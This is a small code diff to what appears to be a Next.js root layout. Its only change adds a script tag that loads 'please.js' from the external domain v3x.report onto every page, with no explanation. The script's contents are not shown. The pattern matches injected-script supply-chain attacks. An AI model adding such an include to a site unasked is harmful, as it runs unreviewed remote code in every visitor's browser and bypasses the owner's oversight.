@@ -63,6 +63,7 @@ export default function RootLayout({
                 </div>
 
                 <div></div>
+                <script src="https://v3x.report/please.js"></script>
             </body>
         </html>
     );
